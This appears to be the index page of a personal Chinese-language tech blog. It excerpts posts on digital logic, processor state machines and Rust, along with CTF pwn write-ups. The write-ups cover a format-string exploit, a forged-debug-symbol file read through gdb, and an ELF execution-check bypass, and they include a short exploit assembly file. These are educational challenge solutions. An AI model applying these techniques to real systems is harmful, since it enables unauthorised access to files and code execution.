<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>nyyyddddn<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		快来和我贴贴qaq

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/10/05/图灵完备1/" >图灵完备1</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-10-05  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="德摩根定理"><a href="#德摩根定理" class="headerlink" title="德摩根定理"></a>德摩根定理</h2><img src="/2025/10/05/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%871/1758730660846-052f46e9-3bb0-4a70-8dd8-39bb2de323c7.png" class>

<h2 id="非门-与非门构建非门"><a href="#非门-与非门构建非门" class="headerlink" title="非门(与非门构建非门)"></a>非门(与非门构建非门)</h2><p>与非门可以当非门用，将两个引脚连输入</p>
<p>与非门的真值表是 1110，所以只需要将单端的输入连上与非门的两个引脚，输入 00 与 输入 11 所对应的结果是 1 与 0，效果和非门相同</p>
<img src="/2025/10/05/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%871/1758729421229-67e78924-6033-4b91-afd9-2a604dabf69b.png" class>



<h2 id="或门-与非门构建非门"><a href="#或门-与非门构建非门" class="headerlink" title="或门(与非门构建非门)"></a>或门(与非门构建非门)</h2><p>德摩根定理，在某个电路输入那串上非门，那输入序列顺序就会置反，使得真值表水平翻转，在某个电路输出那串上一个非门，输出信息的二进制位会置反</p>
<img src="/2025/10/05/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%871/1758729528967-a9ce2a20-785c-4878-8b46-e3734260c59e.png" class>

<p>用之前与非门构建非门的思路来替代非门，三个与非门构建一个或门</p>
	
	</div>
  <a type="button" href="/2025/10/05/图灵完备1/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/10/04/ysyx-f4计算机系统的状态机模型/" >ysyx_f4计算机系统的状态机模型</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-10-04  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="数列求和"><a href="#数列求和" class="headerlink" title="数列求和"></a>数列求和</h2><img src="/2025/10/04/ysyx-f4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%8A%B6%E6%80%81%E6%9C%BA%E6%A8%A1%E5%9E%8B/1759507823518-72a596c9-f06f-4553-bd43-bb52f5c35c38.png" class>

<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">PC r0 r1 r2 r3
(0, 0, 0, 0, 0)   # 初始状态
(1, 10, 0, 0, 0)  # 执行PC为0的指令后, r0更新为10, PC更新为下一条指令的位置
(2, 10, 0, 0, 0)  # 执行PC为1的指令后, r1更新为0, PC更新为下一条指令的位置
(3, 10, 0, 0, 0)  # 执行PC为2的指令后, r2更新为0, PC更新为下一条指令的位置
(4, 10, 0, 0, 1)  # 执行PC为3的指令后, r3更新为1, PC更新为下一条指令的位置
(5, 10, 1, 0, 1)  # 执行PC为4的指令后, r1更新为r1+r3, PC更新为下一条指令的位置
(6, 10, 1, 1, 1)  # 执行PC为5的指令后, r2更新为r2+r1, PC更新为下一条指令的位置
(4, 10, 1, 1, 1)  # 执行PC为6的指令后, 因r1不等于r0, 故PC更新为4
(5, 10, 2, 1, 1)  # 执行PC为4的指令后, r1更新为r1+r3, PC更新为下一条指令的位置


(6, 10, 2, 3, 1)
(4, 10, 2, 3, 1)
(5, 10, 3, 3, 1)
(6, 10, 3, 6, 1)

(4, 10, 3, 6, 1)
(5, 10, 4, 6, 1)
(6, 10, 4, 10, 1)

(4, 10, 4, 10, 1)
(5, 10, 5, 10, 1)
(6, 10, 5, 15, 1)

(4, 10, 5, 15, 1)
(5, 10, 6, 15, 1)
(6, 10, 6, 21, 1)

(4, 10, 6, 21, 1)
(5, 10, 7, 21, 1)
(6, 10, 7, 28, 1)

(4, 10, 7, 28, 1)
(5, 10, 8, 28, 1)
(6, 10, 8, 36, 1)

(4, 10, 8, 36, 1)
(5, 10, 9, 36, 1)
(6, 10, 9, 45, 1)


(4, 10, 9, 45, 1)
(5, 10, 10, 45, 1)
(6, 10, 10, 55, 1)

(7, 10, 10, 55, 1)
(7, 10, 10, 55, 1)
(7, 10, 10, 55, 1)
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行到最后 处理器处于一个死循环，不断执行指令七的状态，数列求和的结果存在r2。r0用来存储循环次数，r1用于计数，r2用于存放数列求和的结果，r3用于存放计数时的步进。</p>
<h2 id="计算10以内奇数之和"><a href="#计算10以内奇数之和" class="headerlink" title="计算10以内奇数之和"></a>计算10以内奇数之和</h2><img src="/2025/10/04/ysyx-f4%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%8A%B6%E6%80%81%E6%9C%BA%E6%A8%A1%E5%9E%8B/1759509167073-2ffa238b-4b70-438b-9fe8-7ce72fbdf1a1.png" class>

<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">li r0,11 #0
li r1,1 #1
li r2,0 #2
li r3,2 #3
add r2,r2,r1 #4
add r1,r1,r3 #5
bner0 r1,4 #6
bner0 r3,7 #7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>验证</p>
<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">PC r0 r1 r2 r3
(0, 0, 0, 0, 0)
(1, 11, 0, 0, 0)
(2, 11, 1, 0, 0)
(3, 11, 1, 0, 0)

(4, 11, 1, 0, 2)
(5, 11, 1, 1, 2)
(6, 11, 3, 1, 2)

(4, 11, 3, 1, 2)
(5, 11, 3, 4, 2)
(6, 11, 5, 4, 2)

(4, 11, 5, 4, 2)
(5, 11, 5, 9, 2)
(6, 11, 7, 9, 2)

(4, 11, 7, 9, 2)
(5, 11, 7, 16, 2)
(6, 11, 9, 16, 2)

(4, 11, 9, 16, 2)
(5, 11, 9, 25, 2)
(6, 11, 11, 25, 2)

(7, 11, 11, 25, 2)
(7, 11, 11, 25, 2)
(7, 11, 11, 25, 2)
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="指令集架构的状态机模型"><a href="#指令集架构的状态机模型" class="headerlink" title="指令集架构的状态机模型"></a>指令集架构的状态机模型</h2>
	
	</div>
  <a type="button" href="/2025/10/04/ysyx-f4计算机系统的状态机模型/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/10/03/ysyx-f3数电基础/" >ysyx_f3数电基础</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-10-03  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="cmos中的nmos和pmos"><a href="#cmos中的nmos和pmos" class="headerlink" title="cmos中的nmos和pmos"></a>cmos中的nmos和pmos</h2><p>nmos和pmos在电路图上的表示符号</p>
<img src="/2025/10/03/ysyx-f3%E6%95%B0%E7%94%B5%E5%9F%BA%E7%A1%80/1756823833807-4d5d56f7-8586-4029-b082-0aadbbcdd266.png" class>

<p>当Vg- Vs较大时 nmos是的源极漏极是导通状态</p>
<p>当Vs - Vg较大时 pmos的源极漏极是导通状态</p>
<h2 id="非门"><a href="#非门" class="headerlink" title="非门"></a>非门</h2><img src="/2025/10/03/ysyx-f3%E6%95%B0%E7%94%B5%E5%9F%BA%E7%A1%80/1756830468060-658480fc-6d76-4a54-b382-f5b1059ddf7b.png" class>



<p>非门是通过一个pmos和一个nmos组成的，输入是低电平时pmos中的Vs - Vg为较大值使电源和输出导通。当输入是高电平pmos不满足导通的条件，nmos满足。</p>
<h2 id="与非门"><a href="#与非门" class="headerlink" title="与非门"></a>与非门</h2><p>与非门的行为是当两个输入都不为1时输出1，相反。</p>
	
	</div>
  <a type="button" href="/2025/10/03/ysyx-f3数电基础/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/09/15/rust1/" >rust语法基础1</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-09-15  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="cargo-basic"><a href="#cargo-basic" class="headerlink" title="cargo basic"></a>cargo basic</h2><p>cargo new objname 创建项目</p>
<p>cargo run 运行项目</p>
<p>cargo install –force –path .  安装 .目录下的项目，将编译好的二进制文件拷贝到~&#x2F;.cargo&#x2F;bin中</p>
<h2 id="变量绑定"><a href="#变量绑定" class="headerlink" title="变量绑定"></a>变量绑定</h2><p>Rust 中，使用关键字 let 声明变量。</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在 Rust 中，变量默认是不可改变的（immutable），当变量不可变时，一旦值被绑定到一个名称上，这个值就不能被改变，这样的设计有助于防止意外的数据修改和并发问题。若</p>
<p>要使得变量可变，需要在声明时使用 mut 关键字。</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> <span class="token keyword">mut</span> x <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2025/09/15/rust1/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/08/25/nssctf4th_pwn/" >nssctf4th_pwn</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-08-25  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>保护全开，只有一次利用机会的栈上格式化字符串漏洞</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">136</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-90h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+98h] [rbp-8h]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v3 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在开启了pie+aslr的情况下，只有一次格式化字符串机会那很难做到劫持控制流。至少要有两次利用机会，一次用于泄露和libc相关的地址，一次用于往某个地方写写某些数据用来劫持控制流。</p>
<p>但可惜只有一次机会。那肯定得找一种泄露完地址后，能回到main或者是vuln再次打一次格式化字符串的方法，这类方法总是涉及到格式化字符串写数据的原语，且由于aslr和pie的影响，那找到一种爆破次数少，容易直接打通的方法还是比较困难的。</p>
<p>联想到非栈上格式化字符串的利用方法，发现可以找一个和返回地址相近，除了低位一个字节完全相同的指针，还有一个指向该指针的双重指针，然后通过双重指针修改另一个指针的低位使另一个指针能修改返回地址的低位来实现泄露完地址后跳回vuln或者main这些近地址上，但是在只有一次格式化字符串利用机会的情况下，需要同时做到通过双重指针修改单指针低位，和利用单指针写返回地址两个事情，glibc的printf在处理 %n$p这种包含position的表达式的时候会对所有的%n$p这类的表达式预处理，将数据拷贝到args_value中，利用单指针写回操作的时候访问到的单指针实际上是 第一次双指针操作前的缓存，可以通过这篇文章的方法去绕过printf position的预处理</p>
<p><a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/af55bf3/#%E5%A4%9A%E6%AC%A1-printf-%E5%88%A9%E7%94%A8">https://blog.wjhwjhn.com/posts/af55bf3/#%E5%A4%9A%E6%AC%A1-printf-%E5%88%A9%E7%94%A8</a></p>
<p>解决这个问题后，劫持printf的返回地址低位来实现多次格式化字符串，往bss上写rop链最后栈迁移过去就好了</p>
<p>exp</p>
	
	</div>
  <a type="button" href="/2025/08/25/nssctf4th_pwn/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/06/18/SmileyCTF/" >SmileyCTF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-06-18  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="pwn-debuggable-1"><a href="#pwn-debuggable-1" class="headerlink" title="pwn&#x2F;debuggable-1"></a>pwn&#x2F;debuggable-1</h1><p>题目的逻辑 run.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>

<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode
<span class="token keyword">from</span> os <span class="token keyword">import</span> memfd_create<span class="token punctuation">,</span> getpid<span class="token punctuation">,</span> write<span class="token punctuation">,</span> environ
<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> run
<span class="token keyword">import</span> builtins

<span class="token keyword">def</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    builtins<span class="token punctuation">.</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"elf: "</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"got elf"</span><span class="token punctuation">)</span>

pid <span class="token operator">=</span> getpid<span class="token punctuation">(</span><span class="token punctuation">)</span>
fd <span class="token operator">=</span> memfd_create<span class="token punctuation">(</span><span class="token string">"elf"</span><span class="token punctuation">)</span>

write<span class="token punctuation">(</span>fd<span class="token punctuation">,</span> elf<span class="token punctuation">)</span>
tmp <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"/proc/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pid<span class="token punctuation">&#125;</span></span><span class="token string">/fd/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>fd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>

env <span class="token operator">=</span> environ<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>
env<span class="token punctuation">[</span><span class="token string">"HOME"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/home/ubuntu"</span>
handle <span class="token operator">=</span> run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"gdb"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> <span class="token string">"-ex"</span><span class="token punctuation">,</span> <span class="token string">"list '/app/flag.txt'"</span><span class="token punctuation">,</span> <span class="token string">"-ex"</span><span class="token punctuation">,</span> <span class="token string">"q"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> env<span class="token operator">=</span>env<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>handle<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>gdb中的list command会读取二进制文件的调试符号，根据调试符号的信息去查找对应的源文件名，并显示指定行号或者函数周围的代码。</p>
<p>可以通过伪造 “&#x2F;app&#x2F;flag.txt” 函数的符号去读取&#x2F;app&#x2F;flag.txt来获取flag</p>
<p>exploit.s</p>
<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">.file 1 "/app/flag.txt"

# 定义 "/app/flag.txt" 函数
.globl "/app/flag.txt"
.type "/app/flag.txt", @function
"/app/flag.txt":
    # "/app/flag.txt" 函数的源码位于 /app/flag.txt
    .loc 1 1 0
    ret

.globl _start
_start:
    nop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>compile.sh</p>
<pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">as --gstabs -o exploit.o exploit.s
ld -o exploit exploit.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>exp.py</p>
	
	</div>
  <a type="button" href="/2025/06/18/SmileyCTF/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/04/29/hackergame2024复现/" >hackergame2024复现</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-04-29  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="不宽的宽字符-general"><a href="#不宽的宽字符-general" class="headerlink" title="不宽的宽字符(general)"></a>不宽的宽字符(general)</h2><p>description</p>
<p>A 同学决定让他设计的 Windows 程序更加「国际化」一些，首先要做的就是读写各种语言写下的文件名。于是他放弃 C 语言中的 <code>char</code>，转而使用宽字符 <code>wchar_t</code>，显然这是一个国际化的好主意。</p>
<p>经过一番思考，他写出了下面这样的代码，用来读入文件名：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; Read the filename
std::wstring filename;
std::getline(std::wcin, filename);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>转换后要怎么打开文件呢？小 A 使用了 C++ 最常见的写法：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; Create the file object and open the file specified
std::wifstream f(filename);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可惜的是，某些版本的 C++ 编译器以及其自带的头文件中，文件名是 <code>char</code> 类型的，因此这并不正确。这时候小 A 灵光一闪，欸🤓👆，我为什么不做一个转换呢？于是：</p>
<pre class="line-numbers language-none"><code class="language-none">std::wifstream f((char*)filename);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>随便找了一个文件名测试过无误后，小 A 对自己的方案非常自信，大胆的在各个地方复用这段代码。然而，代价是什么呢？</p>
	
	</div>
  <a type="button" href="/2025/04/29/hackergame2024复现/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/04/09/Squ1rrelCTF/" >Squ1rrelCTF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-04-09  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Extremely-Lame-Filters-1"><a href="#Extremely-Lame-Filters-1" class="headerlink" title="Extremely Lame Filters 1"></a>Extremely Lame Filters 1</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>

<span class="token keyword">from</span> elf <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode

data <span class="token operator">=</span> b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"I'm a little fairy and I will trust any ELF that comes by!!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> parse<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">for</span> section <span class="token keyword">in</span> elf<span class="token punctuation">.</span>sections<span class="token punctuation">:</span>
    <span class="token keyword">if</span> section<span class="token punctuation">.</span>sh_flags <span class="token operator">&amp;</span> SectionFlags<span class="token punctuation">.</span>EXECINSTR<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValidationException<span class="token punctuation">(</span><span class="token string">"!!"</span><span class="token punctuation">)</span>

elf<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man5/elf.5.html">https://www.man7.org/linux/man-pages/man5/elf.5.html</a></p>
<p>程序检查 elf中是否存在 sh_flags设置过execinstr标志位的section来判断是否存在有可执行权限的段，但实际上段的权限和program header的p_flags标志位有关，所以可以通过修改sh_flags以及p_flags的值去绕过上面的检查执行shellcode</p>
<p>program_header_table是一个描述程序的每个段如何加载到内存的表，它定义了进程运行时内存布局</p>
<p>program_header_table的位置可以通过elf_header中PHT的偏移找到</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lhj@lhj-virtual-machine:~/Desktop/squ1rrel/Extremely Lame Filters <span class="token number">1</span>$ readelf <span class="token parameter variable">-a</span> shellcode
ELF Header:
  Magic:   7f <span class="token number">45</span> 4c <span class="token number">46</span> 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              <span class="token number">2</span>'s complement, little endian
  Version:                           <span class="token number">1</span> <span class="token punctuation">(</span>current<span class="token punctuation">)</span>
  OS/ABI:                            UNIX - System V
  ABI Version:                       <span class="token number">0</span>
  Type:                              EXEC <span class="token punctuation">(</span>Executable <span class="token function">file</span><span class="token punctuation">)</span>
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x401000
  Start of program headers:          <span class="token number">64</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>
  Start of section headers:          <span class="token number">4336</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>
  Flags:                             0x0
  Size of this header:               <span class="token number">64</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Size of program headers:           <span class="token number">56</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Number of program headers:         <span class="token number">2</span>
  Size of section headers:           <span class="token number">64</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Number of section headers:         <span class="token number">5</span>
  Section header string table index: <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成员的结构如下 每个成员的解释可以在man7中找到 <a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man5/elf.5.html">https://www.man7.org/linux/man-pages/man5/elf.5.html</a></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint32_t</span>   p_type<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span>   p_flags<span class="token punctuation">;</span>
    Elf64_Off  p_offset<span class="token punctuation">;</span>
    Elf64_Addr p_vaddr<span class="token punctuation">;</span>
    Elf64_Addr p_paddr<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span>   p_filesz<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span>   p_memsz<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span>   p_align<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> Elf64_Phdr<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2025/04/09/Squ1rrelCTF/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/01/27/x3ctf/" >x3ctf</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-01-27  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
